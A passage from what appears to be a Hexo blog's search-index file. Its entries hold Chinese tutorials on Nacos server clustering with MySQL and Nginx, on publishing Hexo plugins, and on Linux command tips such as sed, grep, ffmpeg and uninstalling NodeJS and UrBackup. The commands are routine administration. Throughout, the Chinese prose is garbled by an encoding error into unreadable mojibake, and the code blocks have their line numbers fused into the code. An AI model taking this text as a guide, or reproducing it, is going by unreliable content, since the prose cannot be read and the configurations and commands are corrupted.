7.1 é»˜è®¤çš„æ•°æ®æ–‡ä»¶åä¸ºï¼štipuesearch_content.jsï¼ŒTipue Search æ—§ç‰ˆæœ¬çš„æ•°æ®æ–‡ä»¶ååˆ™ä¸ºï¼štipuesearch_content.json Tipue Search æ”¯æŒåŒ…æ‹¬ï¼šChrome 49+ï¼ŒEdge 16+ï¼Œ IE10+ï¼Œ Firefox 58+ï¼Œ Safari 11+ï¼Œ iOS Safari 10.3+ï¼Œ Chrome for Android 66+ï¼Œ Samsung Internet 4+ ç­‰ç°ä»£æµè§ˆå™¨ æœ€ç»ˆæœç´¢æ•ˆæœå›¾ Tipue Search Preview å‚è€ƒèµ„æ–™ Tipue Search å®˜ç½‘ Hexo-Tipue-Search-Json æ’ä»¶ Hexo-Generator-SearchDB æ’ä»¶ åˆ†äº«å‡ ä¸ªå®ç”¨çš„ Hexo åšå®¢åŠŸèƒ½æ’ä»¶ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢"},{title:"Nacos å…¥é—¨æ•™ç¨‹ - é…ç½®ç®¡ç†é«˜çº§ç¯‡",url:"/posts/cc563108.html",text:'ä¸Šç¯‡ - Nacos å…¥é—¨æ•™ç¨‹ - é…ç½®ç®¡ç†ï¼ˆä¸­çº§ç¯‡ï¼‰ Nacos å…¥é—¨æ•™ç¨‹ - é…ç½®ç®¡ç†ä¸­çº§ç¯‡ Nacos Server é›†ç¾¤éƒ¨ç½²æ¨¡å¼Nacos Server æ”¯æŒä¸‰ç§éƒ¨ç½²æ¨¡å¼ï¼š å•æœºæ¨¡å¼ - ç”¨äºæµ‹è¯•å’Œå•æœºè¯•ç”¨ é›†ç¾¤æ¨¡å¼ - ç”¨äºç”Ÿäº§ç¯å¢ƒï¼Œç¡®ä¿é«˜å¯ç”¨ å¤šé›†ç¾¤æ¨¡å¼ - ç”¨äºå¤šæ•°æ®ä¸­å¿ƒåœºæ™¯ é›†ç¾¤æ­å»ºå®‰è£… Nacos Server é›†ç¾¤ç¯å¢ƒä¸‹ï¼Œè‡³å°‘éœ€è¦å®‰è£…ä¸‰å°ä»¥ä¸Šçš„ Nacos Serverï¼Œä¸€èˆ¬æƒ…å†µä¸‹å¤åˆ¶ä¸‰ä»½ Nacos Server è§£å‹åçš„æ–‡ä»¶å¤¹å³å¯ï¼Œåˆ†åˆ«å‘½åä¸º nacos-1ã€nacos-2ã€nacos-3ã€‚ é…ç½® IP ä¸ ç«¯å£ è‹¥æ˜¯å•æœºæ­å»º Nacos Server é›†ç¾¤ï¼Œåˆ™éœ€è¦æ›´æ”¹æ¯å° Nacos Server ç›®å½•çš„ conf ç›®å½•ä¸‹çš„ application.properties é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡ server.port å‚æ•°è®©æ¯å° Nacos Server ä½¿ç”¨ä¸åŒçš„ç«¯å£ï¼Œä»¥æ­¤æ¥é¿å…ç«¯å£å†²çªã€‚ åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œè‹¥æ¯å° Nacos Sever éƒ½æœ‰ç‹¬ç«‹çš„çœŸå® IP åœ°å€ï¼Œæˆ–è€…å•å° Nacos Server æ‹¥æœ‰å¤šå—ç½‘å¡æ—¶ï¼Œåˆ™éœ€è¦åœ¨æ¯å° Nacos Server ç›®å½•çš„ conf ç›®å½•ä¸‹çš„ application.properties é…ç½®æ–‡ä»¶é‡Œé€šè¿‡ nacos.inetutils.ip-address å‚æ•°ç»‘å®šçœŸå®çš„ IP åœ°å€ã€‚ 12server.port=8848nacos.inetutils.ip-address=192.168.1.124 é…ç½®é›†ç¾¤é…ç½®æ–‡ä»¶ åœ¨æ‰€æœ‰ Nacos Server ç›®å½•çš„ conf ç›®å½•ä¸‹æ‰¾åˆ° cluster.conf.example é…ç½®æ–‡ä»¶ï¼Œå°†å…¶é‡å‘½åä¸º cluster.confï¼Œå¹¶å°†æ‰€æœ‰ Nacos Server çš„ IP åœ°å€ä»¥ ip:port çš„æ ¼å¼å†™åˆ°é…ç½®æ–‡ä»¶é‡Œï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š ç‰¹åˆ«æ³¨æ„ï¼šè¿™é‡Œçš„ IP ä¸èƒ½å†™ 127.0.0.1ï¼Œå¿…é¡»æ˜¯ Linux å‘½ä»¤ hostname -i èƒ½å¤Ÿè¯†åˆ«çš„ IP 123192.168.1.124:8848 # Nacos Server 1192.168.1.124:8849 # Nacos Server 2192.168.1.124:8850 # Nacos Server 3 é…ç½® MySQL æ•°æ®æº Nacos Server é»˜è®¤ä½¿ç”¨åµŒå…¥å¼æ•°æ®åº“å®ç°æ•°æ®çš„å­˜å‚¨ï¼Œè‹¥ç›´æ¥å¯åŠ¨å¤šä¸ªé»˜è®¤é…ç½®ä¸‹çš„ Nacos Server èŠ‚ç‚¹ï¼Œæ•°æ®å­˜å‚¨ä¼šå­˜åœ¨ä¸€è‡´æ€§çš„é—®é¢˜ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒNacos Server é‡‡ç”¨äº†é›†ä¸­å­˜å‚¨çš„æ–¹å¼æ¥æ”¯æŒé›†ç¾¤åŒ–éƒ¨ç½²ï¼Œç›®å‰åªæ”¯æŒ MySQL çš„å­˜å‚¨ï¼ˆ5.6.5+ï¼‰ã€‚ç”±äºå‰é¢çš„æ•™ç¨‹å·²ç»ä»‹ç»è¿‡ Nacos Server å¦‚ä½•é…ç½® MySQL æ•°æ®æºï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ¯å° Nacos Server éƒ½éœ€è¦å•ç‹¬é…ç½® MySQL æ•°æ®æºã€‚ é›†ç¾¤æ¨¡å¼ä¸‹å¯åŠ¨ å¯åŠ¨ Nacos Server é›†ç¾¤ï¼Œéœ€è¦åˆ†åˆ«åœ¨æ¯å° Nacos Server ç›®å½•çš„ bin ç›®å½•ä¸‹æ‰§è¡Œå¯åŠ¨è„šæœ¬ 123$ sh nacos-1/bin/startup.sh$ sh nacos-2/bin/startup.sh$ sh nacos-3/bin/startup.sh è‹¥æ¯å° Nacos Server åœ¨å¯åŠ¨æ—¶è¾“å‡ºä»¥ä¸‹æ—¥å¿—ä¿¡æ¯ï¼Œè¯´æ˜ Nacos Server æ˜¯ä»¥é›†ç¾¤æ¨¡å¼å¯åŠ¨äº† 12nacos is starting with clusternacos is startingï¼Œyou can check the /nacos-x/logs/start.out é›†ç¾¤æ¨¡å¼ä¸‹å…³é—­ è‹¥å¸Œæœ›å…³é—­ Nacos Server é›†ç¾¤ï¼ŒåŒæ ·åˆ†åˆ«åœ¨æ¯å° Nacos Server ç›®å½•çš„ bin ç›®å½•ä¸‹æ‰§è¡Œå…³é—­è„šæœ¬å³å¯ 123$ sh nacos-1/bin/shutdown.sh$ sh nacos-2/bin/shutdown.sh$ sh nacos-3/bin/shutdown.sh Spring Cloud é…ç½® Nacos Server é›†ç¾¤ 1234567spring: application: name: service cloud: nacos: config: server-addr: 192.168.1.124:8848,192.168.1.124:8849,192.168.1.124:8850 # å½“ä¸ä½¿ç”¨Nginxä½œä¸ºè´Ÿè½½å‡è¡¡æœåŠ¡æ—¶ï¼Œå¯ä»¥ç›´æ¥å¡«å†™å¤šä¸ªNacos ServerèŠ‚ç‚¹çš„IP é›†ç¾¤å¯åŠ¨å¤±è´¥è§£å†³æ–¹æ³• è‹¥æœºå™¨ä¸èƒ½åŒæ—¶å¯åŠ¨ä¸‰ä¸ª Nacos Server å®ä¾‹ï¼Œå»ºè®®æ£€æŸ¥æ˜¯å¦å†…å­˜ä¸å¤Ÿï¼Œæ­¤æ—¶å¯ä»¥åœ¨æ¯å° Nacos Server ç›®å½•çš„ bin ç›®å½•ä¸‹çš„ startup.sh å¯åŠ¨è„šæœ¬é‡Œé€‚å½“è°ƒæ•´ JVM çš„å†…å­˜å‚æ•° 12$ vim startup.shJAVA_OPT="${JAVA_OPT} -server -Xms2g -Xmx2g -Xmn1g -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=320m" é›†ç¾¤éƒ¨ç½²æ¶æ„ï¼ˆé«˜å¯ç”¨ï¼‰å¤šç§éƒ¨ç½²æ¨¡å¼ http://ip1:port/openAPI ç›´è¿ IP æ¨¡å¼ï¼Œæœºå™¨å®•æœºåˆ™éœ€è¦ä¿®æ”¹ IP æ‰å¯ä»¥ä½¿ç”¨ http://VIP:port/openAPI æŒ‚è½½ VIP æ¨¡å¼ï¼Œç›´è¿ VIP å³å¯ï¼Œä¸‹é¢æŒ‚è½½ Server çœŸå® IPï¼Œå¯è¯»æ€§ä¸å¥½ http://nacos.com:port/openAPI åŸŸå + VIP æ¨¡å¼ï¼Œå¯è¯»æ€§å¥½ï¼Œè€Œä¸”æ¢ IP æ–¹ä¾¿ï¼Œå½“ Nacos é›†ç¾¤è¿ç§»æ—¶å®¢æˆ·ç«¯ä¹Ÿæ— éœ€ä¿®æ”¹ï¼Œæ¨èä½¿ç”¨æ­¤æ¨¡å¼ï¼Œéƒ¨ç½²æ¶æ„å›¾å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š Nginx åå‘ä»£ç†é…ç½®åœ¨ Nacos Server çš„é›†ç¾¤å¯åŠ¨å®Œæ¯•ä¹‹åï¼Œæ ¹æ®ä¸Šé¢çš„éƒ¨ç½²æ¶æ„å›¾æ‰€ç¤ºï¼Œè¿˜éœ€è¦æä¾›ä¸€ä¸ªç»Ÿä¸€çš„å…¥å£ç»™ Spring Cloud åº”ç”¨è®¿é—®ã€‚ç®€å•åœ°è¯´ï¼Œå°±æ˜¯éœ€è¦ä¸ºä¸Šé¢å¯åŠ¨çš„çš„ä¸‰ä¸ª Nacos Server èŠ‚ç‚¹åšä¸€ä¸ªå¯ä»¥ä¸ºå®ƒä»¬å®ç°è´Ÿè½½å‡è¡¡çš„è®¿é—®ç‚¹ã€‚è¿™ä¸ªå®ç°çš„æ–¹å¼éå¸¸å¤šï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ Nginx æ¥å®ç°ï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œè€ƒè™‘åˆ° Nginx çš„é«˜å¯ç”¨æ€§ï¼Œå»ºè®®ä½¿ç”¨ Nginx + Keepalive æ¥æ­å»º Nginx é›†ç¾¤ã€‚ 123456789101112131415upstream nacos { server 192.168.1.124:8848; server 192.168.1.124:8849; server 192.168.1.124:8850;}server { listen 80; server_name nacos.a-hh.cn; location / { proxy_pass http://nacos; }} MySQL æ•°æ®åº“é«˜å¯ç”¨åœ¨ Nacos Server é›†ç¾¤æ¨¡å¼ä¸‹ï¼Œå½“é‡‡ç”¨ MySQL ä½œä¸ºå¤–ç½®æ•°æ®æºæ—¶ï¼Œä¸ºäº†ç¡®ä¿æ•°æ®åº“çš„é«˜å¯ç”¨æ€§ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸‹å»ºè®® MySQL è‡³å°‘ä½¿ç”¨ä¸»å¤‡æ¨¡å¼ï¼Œæˆ–è€…é‡‡ç”¨é«˜å¯ç”¨æ•°æ®åº“ã€‚å¯é€šè¿‡ä¿®æ”¹ ${nacos-home}/conf/application.properties é…ç½®æ–‡ä»¶ï¼Œè®© Nacos Server æ‹¥æœ‰å¤šä¸ªæ•°æ®æºï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 1234567spring.datasource.platform=mysqldb.num=1db.url.0=jdbc:mysql://192.168.1.1:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTCdb.url.1=jdbc:mysql://192.168.1.2:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTCdb.user=rootdb.password=123456 ç‰¹åˆ«æ³¨æ„ï¼šè‹¥ MySQL é…ç½®äº†ä¸»ä»åº“ï¼ˆä¸»ä»åŒæ­¥ï¼‰ï¼Œå½“ä¸»åº“å®•æœºåï¼Œåˆ‡æ¢åˆ°ä»åº“ï¼Œæ­¤æ—¶åˆ‡åˆ°ä»åº“åä¼šå¯¼è‡´ä¸»åº“çš„æ•°æ®æ¯”ä»åº“å°‘ï¼Œå³ä¼šå‡ºç°æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ã€‚ é›†ç¾¤é«˜å¯ç”¨éƒ¨ç½²æ¶æ„å›¾ å¤šé›†ç¾¤æ¨¡å¼Nacos Server æ”¯æŒ NameServer è·¯ç”±è¯·æ±‚æ¨¡å¼ï¼Œé€šè¿‡å®ƒå¯ä»¥è®¾è®¡ä¸€ä¸ªæœ‰ç”¨çš„æ˜ å°„è§„åˆ™æ¥æ§åˆ¶è¯·æ±‚è½¬å‘åˆ°ç›¸åº”çš„é›†ç¾¤ï¼Œåœ¨æ˜ å°„è§„åˆ™ä¸­å¯ä»¥æŒ‰å‘½åç©ºé—´æˆ–ç§Ÿæˆ·ç­‰åˆ†ç‰‡è¯·æ±‚ã€‚ å¤šç½‘å¡ IP é€‰æ‹© å½“æœ¬åœ°ç¯å¢ƒæ¯”è¾ƒå¤æ‚çš„æ—¶å€™ï¼ŒNacos æœåŠ¡åœ¨å¯åŠ¨çš„æ—¶å€™éœ€è¦é€‰æ‹©è¿è¡Œæ—¶ä½¿ç”¨çš„ IP æˆ–è€…ç½‘å¡ã€‚Nacos Server ä»å¤šç½‘å¡è·å– IP å‚è€ƒäº† Spring Cloud è®¾è®¡ï¼Œé€šè¿‡ nacos.inetutils å‚æ•°ï¼Œå¯ä»¥æŒ‡å®š Nacos ä½¿ç”¨çš„ç½‘å¡å’Œ IP åœ°å€ï¼Œç›®å‰æ”¯æŒçš„é…ç½®å‚æ•°æœ‰ï¼š ip-address å‚æ•°å¯ä»¥ç›´æ¥è®¾ç½® Nacos çš„ IP 1nacos.inetutils.ip-address=10.11.105.155 use-only-site-local-interfaces å‚æ•°å¯ä»¥è®© Nacos ä½¿ç”¨å±€åŸŸç½‘ IPï¼Œè¿™ä¸ªåœ¨ Nacos éƒ¨ç½²çš„æœºå™¨æœ‰å¤šç½‘å¡æ—¶å¾ˆæœ‰ç”¨ï¼Œå¯ä»¥è®© Nacos é€‰æ‹©å±€åŸŸç½‘ç½‘å¡ 1nacos.inetutils.use-only-site-local-interfaces=true ignored-interfaces æ”¯æŒç½‘å¡æ•°ç»„ï¼Œå¯ä»¥è®© Nacos å¿½ç•¥å¤šä¸ªç½‘å¡ 12- nacos.inetutils.ignored-interfaces[0]=eth0- nacos.inetutils.ignored-interfaces[1]=eth1 preferred-networks å‚æ•°å¯ä»¥è®© Nacos ä¼˜å…ˆé€‰æ‹©åŒ¹é…çš„ IPï¼Œæ”¯æŒæ­£åˆ™åŒ¹é…å’Œå‰ç¼€åŒ¹é… 12nacos.inetutils.preferred-networks[0]=30.5.124.nacos.inetutils.preferred-networks[0]=30.5.124.(25[0-5]|2[0-4]\\\\d|((1d{2})|([1-9]?\\\\d))),30.5.124.(25[0-5]|2[0-4]\\\\d|((1d{2})|([1-9]?\\\\d))) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Hexo æ’ä»¶å¼€å‘",url:"/posts/f30bc89b.html",text:'Hexo å®˜æ–¹æ•™ç¨‹ æ™®é€šæ’ä»¶å¼€å‘ æ ‡ç­¾æ’ä»¶å¼€å‘ å·²å¼€å‘æ’ä»¶çš„åˆ—è¡¨ hexo-pdf-betterï¼ŒHexo PDF æ’ä»¶ hexo-site-authï¼ŒHexo ç«™ç‚¹éªŒè¯æ’ä»¶ hexo-google-adsenseï¼ŒHexo è°·æ­Œå¹¿å‘Šæ’ä»¶ hexo-admonition-betterï¼ŒHexo å†…å®¹è¾…åŠ©æ’ä»¶ hexo-tipue-search-dbï¼ŒHexo å…¨æ–‡é™æ€æœç´¢æ’ä»¶ hexo-lazyload-image-betterï¼ŒHexo å›¾ç‰‡æ‡’åŠ è½½æ’ä»¶ hexo-waline-nextï¼Œé€‚ç”¨äº NexT ä¸»é¢˜çš„ Waline è¯„è®ºæ’ä»¶ hexo-next-darkmodeï¼Œé€‚ç”¨äº NexT ä¸»é¢˜çš„æš—é»‘æ¨¡å¼åˆ‡æ¢æ’ä»¶ hexo-generator-sogou-sitemapï¼ŒHexo ç”Ÿæˆæœç‹—ç«™ç‚¹åœ°å›¾çš„æ’ä»¶ hexo-readmoreï¼ŒHexo é˜…è¯»æ›´å¤šæ’ä»¶ï¼Œå°†å°†åšå®¢æµé‡å¯¼æµåˆ°å¾®ä¿¡å…¬ä¼—å· å‘å¸ƒæ’ä»¶åˆ° Hexo å®˜ç½‘å½“å®Œæˆæ’ä»¶çš„å¼€å‘åï¼Œå¯ä»¥è€ƒè™‘å°†å®ƒå‘å¸ƒåˆ° Hexo çš„æ’ä»¶åˆ—è¡¨ï¼Œè®©æ›´å¤šäººèƒ½å¤Ÿä½¿ç”¨è‡ªå·±å¼€å‘çš„æ’ä»¶ï¼Œå…¶ä¸­å‘å¸ƒæ’ä»¶çš„æ­¥éª¤ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰å’Œ Hexo æ›´æ–°æ–‡æ¡£éå¸¸ç±»ä¼¼ã€‚ Fork hexojs/site ä»“åº“ å°†å·² Fork çš„ä»“åº“ Clone åˆ°æœ¬åœ°ç£ç›˜ï¼Œå¹¶å®‰è£…æ‰€ä¾èµ–çš„æ’ä»¶ 123$ git clone https://github.com/&lt;username&gt;/site.git$ cd site$ npm install ç¼–è¾‘ source/_data/plugins.yml æ–‡ä»¶ï¼Œæ–°å¢è‡ªå·±çš„æ’ä»¶ï¼Œä¾‹å¦‚ï¼š 1234567- name: hexo-next-darkmode description: Add Darkmode for NexT theme link: https://github.com/rqh656418510/hexo-next-darkmode tags: - next - darkmode - nightmode å¯ä»¥é€šè¿‡ Hexo å¯åŠ¨æœåŠ¡å™¨é¢„è§ˆå˜åŠ¨ 1$ hexo server æ¨é€ï¼ˆPushï¼‰ä»£ç  12$ cd site$ git push orign master åœ¨ Github å»ºç«‹ä¸€ä¸ªæ–°çš„åˆå¹¶ç”³è¯·ï¼ˆPull Requestï¼‰å¹¶æè¿°æ”¹åŠ¨ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢ å‰ç«¯"},{title:"æ—¥å¸¸ç¼–ç¨‹å¼€å‘æŠ€å·§ä¹‹äºŒ",url:"/posts/eb118fe2.html",text:'Centos 7 å¸è½½ç³»ç»Ÿè‡ªå¸¦çš„ NodeJs 123456789101112131415# æŸ¥çœ‹å·²å®‰è£…çš„npm# rpm -qa|grep npm# æŸ¥çœ‹å·²å®‰è£…çš„nodejs# rpm -qa|grep nodejs# å¸è½½# yum -y remove nodejs npm# åˆ é™¤æ®‹ç•™æ–‡ä»¶# rm -rf ~/.npm# rm -rf ~/.npmrc# rm -f /usr/bin/npm# rm -f /usr/bin/node# rm -rf /usr/lib/node_modules Linux æ‰¹é‡æ›¿æ¢æ–‡ä»¶å†…å®¹ 12345678910111213# å‘½ä»¤æ ¼å¼ï¼šsed -i "s/æŸ¥æ‰¾å­—æ®µ/æ›¿æ¢å­—æ®µ/g" `grep æŸ¥æ‰¾å­—æ®µ -rl è·¯å¾„`# ä¸ºäº†ä¸åŒºåˆ†å¤§å°å†™åŒ¹é…æœç´¢ï¼Œå¯ä»¥ä½¿ç”¨ I å‚æ•°$ sed \'s/unix/linux/gI\' sed-test.txt# å°†å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²oldstringæ›¿æ¢ä¸ºnewstring$ sed -i "s/oldstring/newstring/g" `ls`# æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æ‰€æœ‰åç¼€ä¸ºmdçš„æ–‡ä»¶ï¼Œå¹¶å°†æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²oldstringæ›¿æ¢ä¸ºnewstring$ sed -i "s/oldstring/newstring/g" `find . -name "*.md"`# å½“æœç´¢å’Œæ›¿æ¢å«åˆ†éš”ç¬¦çš„å­—ç¬¦ä¸²æ—¶ï¼Œéœ€è¦ç”¨åæ–œæ  \\ æ¥å–æ¶ˆè½¬ä¹‰$ sed "s/\\/bin\\/bash/\\/usr\\/bin\\/fish/g" sed-test.txt Linux åˆ é™¤æ–‡ä»¶ä¸­çš„æŸè¡Œå†…å®¹ 12345# åˆ é™¤æ–‡ä»¶ä¸­çš„æŸè¡Œå†…å®¹$ sed -i \'/hello/d\' abc.txt# æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æ‰€æœ‰åç¼€ä¸ºtxtçš„æ–‡ä»¶ï¼Œå¹¶æ‰¹é‡åˆ é™¤æ–‡ä»¶ä¸­çš„æŸè¡Œå†…å®¹$ find . -type f -iname "*.txt" | xargs -I {} sed -i \'/hello/d\' {} Linux æ‰¹é‡æ›¿æ¢æ–‡ä»¶åä¸­çš„å­—ç¬¦ä¸² 12345678910111213141516# å‡è®¾åŸæ–‡ä»¶åæ˜¯â€œstu_102999_5_finished.jpgâ€ï¼Œéœ€è¦æ›¿æ¢å­—ç¬¦ä¸²"_finished"ä¸º""ç©ºå­—ç¬¦ä¸²# æ–¹æ³•ä¸€ï¼šä½¿ç”¨renameæ”¹å(æ”¯æŒä¸­æ–‡ç‰¹æ®Šå­—ç¬¦çš„æ›¿æ¢)$ rename "_finished" "" *.jpg# ä½¿ç”¨renameæ‰¹é‡æ”¹å$ find . -name "*.avi" | xargs -I {} rename "xxx" "" {}# æ–¹æ³•äºŒï¼šforå¾ªç¯ç»“åˆsedæ›¿æ¢$ for file in `ls *.jpg`;do mv $file `echo $file|sed \'s/_finished//g\'`;done;# æ–¹æ³•ä¸‰ï¼šforå¾ªç¯åŠ å˜é‡éƒ¨åˆ†æˆªå–$ for file in `ls *.jpg`;do mv $file `echo ${file%_finished*}.jpg`;done;# æ–¹æ³•å››ï¼šlsç»“åˆawkï¼Œè¾“å‡ºäº¤ç»™bashæ‰§è¡Œ$ ls *.jpg |awk -F "_finished" \'{print "mv "$0" "$1$2""}\'|bash Linux æœç´¢æ–‡ä»¶é‡Œé¢çš„å†…å®¹ 1234567891011121314# åœ¨å•ä¸ªæ–‡ä»¶ä¸­æœç´¢å†…å®¹ï¼ŒåŒºåˆ†å¤§å°å†™$ grep \'keyword\' filename# åœ¨å•ä¸ªæ–‡ä»¶ä¸­æœç´¢å†…å®¹ï¼Œå¿½ç•¥åŒºåˆ†å¤§å°å†™$ grep -i \'keyword\' filename# åœ¨å¤šä¸ªæ–‡ä»¶ä¸­æœç´¢å†…å®¹ï¼Œå¿½ç•¥åŒºåˆ†å¤§å°å†™$ grep -i \'keyword\' filename1 filename2 filename3# æœç´¢ä¸€ä¸ªç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶é‡Œé¢çš„å†…å®¹ï¼Œå¿½ç•¥åŒºåˆ†å¤§å°å†™$ find . -type f -name "*" | xargs grep -i "keyword"# æœç´¢ä¸€ä¸ªç›®å½•ä¸‹åç¼€ä¸º .properties çš„æ–‡ä»¶é‡Œé¢çš„å†…å®¹ï¼Œå¿½ç•¥åŒºåˆ†å¤§å°å†™$ find . -type f -name "*.properties" | xargs grep -i "keyword" FFmpeg å¸¸ç”¨å‘½ä»¤ 12345# å°†flvæ ¼å¼çš„è§†é¢‘è½¬æ¢ä¸ºmp4æ ¼å¼$ ffmpeg -i xxxxx.flv xxxxx.mp4# æŒ‰æ—¶é—´æˆ³æˆªå–è§†é¢‘ç‰‡æ®µ$ ffmpeg -i ./SN.mp4 -vcodec copy -acodec copy -ss 00:00:00 -to 00:00:05 ./cutout1.mp4 -y Hexo åˆ›å»ºè‰ç¨¿ 12345678910111213# åˆ›å»ºè‰ç¨¿ï¼Œé»˜è®¤ä¼šåœ¨source/_draftsç›®å½•ä¸‹ç”Ÿæˆfirst-draft.mdæ–‡ä»¶$ hexo new draft "first-draft"# æç¤ºï¼šè‰ç¨¿ä¸ä¼šè¢«æ˜¾ç¤ºåœ¨ä»»ä½•é¡µé¢ä¸Šï¼Œé“¾æ¥ä¹Ÿè®¿é—®ä¸åˆ°ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæƒ³æŠŠæŸä¸€ç¯‡æ–‡ç« ç§»é™¤æ˜¾ç¤ºï¼Œåˆä¸èˆå¾—åˆ é™¤ï¼Œå¯ä»¥å°è¯•æŠŠå®ƒç§»åŠ¨åˆ°source/_draftsç›®å½•ä¹‹ä¸­# å¦‚æœå¸Œæœ›å¼ºè¡Œé¢„è§ˆè‰ç¨¿ï¼Œå¯ä»¥æ›´æ”¹_config.ymlé…ç½®æ–‡ä»¶ä¸­çš„ä»¥ä¸‹å‚æ•°render_drafts: true# æˆ–è€…ï¼Œä½¿ç”¨å¦‚ä¸‹æ–¹å¼å¯åŠ¨serveråé¢„è§ˆè‰ç¨¿$ hexo server --drafts# å°†è‰ç¨¿è½¬æˆæ­£å¼æ–‡ç« $ hexo publish "first-draft" Linux å‹ç¼© Jpeg å›¾ç‰‡ 1234567891011# å®‰è£…è½¯ä»¶# yum install -y jpegoptim# æŒ‡å®šå›¾ç‰‡å‹ç¼©åçš„å¤§å°$ jpegoptim --size=520k pic.jpeg# æŒ‡å®šå›¾ç‰‡å‹ç¼©è´¨é‡$ jpegoptim -m80 pic.jpg --dest pic-2.jpg# æ‰¹é‡å‹ç¼©å›¾ç‰‡$ find . -name "*.jpg" | xargs jpegoptim Linux å‹ç¼© Png å›¾ç‰‡ 12345# å®‰è£…è½¯ä»¶# yum install -y optipng# å‹ç¼©å›¾ç‰‡$ optipng pic.png -out pic-2.png https://github.com/bugwhine/lookbusy å¸è½½ UrBackup æœåŠ¡ 12345678910111213141516171819202122232425# æç¤ºï¼šUrBackupçš„æœåŠ¡ä¹‹å‰æ˜¯é€šè¿‡æ‰‹åŠ¨ç¼–è¯‘çš„æ–¹å¼æ¥å®‰è£…# æŸ¥æ‰¾UrBackupçš„è‡ªå¯åŠ¨æœåŠ¡# systemctl list-unit-files --type=service | grep enabled | grep urbackup# åœæ­¢UrBackupçš„è‡ªå¯åŠ¨æœåŠ¡# systemctl stop urbackup-server.service# systemctl disable urbackup-server.service# åˆ é™¤UrBackupçš„æ—¥å¿—æ–‡ä»¶# rm -rf /var/log/urbackup.log# åˆ é™¤UrBackupçš„å®‰è£…æ–‡ä»¶# rm -rf /usr/local/var/urbackup# rm -rf /usr/local/share/urbackup# rm -rf /usr/local/bin/urbackupsrv# åˆ é™¤UrBackupçš„é…ç½®æ–‡ä»¶# rm -rf /etc/default/urbackupsrv# rm -rf /etc/logrotate.d/urbackupsrv# rm -rf /etc/systemd/system/urbackup-server.service# æŸ¥æ¼è¡¥ç¼ºï¼Œå°†æœç´¢åˆ°çš„æ–‡ä»¶å…¨éƒ¨åˆ é™¤æ‰# find / -type d -iname \'urbackup\'# find / -type f -iname \'urbackupsrv\' Github æœç´¢æŠ€å·§ Github å®˜æ–¹çš„æœç´¢è¯­æ³•ä»‹ç»ï¼Œå¸¸ç”¨æœç´¢ç¤ºä¾‹å¦‚ä¸‹ï¼Œå½“åŒæ—¶ä½¿ç”¨å¤šä¸ªæœç´¢å‚æ•°æ—¶ï¼Œä½¿ç”¨â€ ç©ºæ ¼â€ ç¬¦éš”å¼€ä¸åŒçš„å‚æ•° in:name spring // æœç´¢åå­—ä¸­å¸¦æœ‰â€springâ€ çš„é¡¹ç›® in:readme spring // æœç´¢ readme ä¸­å¸¦æœ‰â€springâ€ çš„é¡¹ç›® in:description spring // æœç´¢æè¿°ä¸­å¸¦æœ‰â€springâ€ 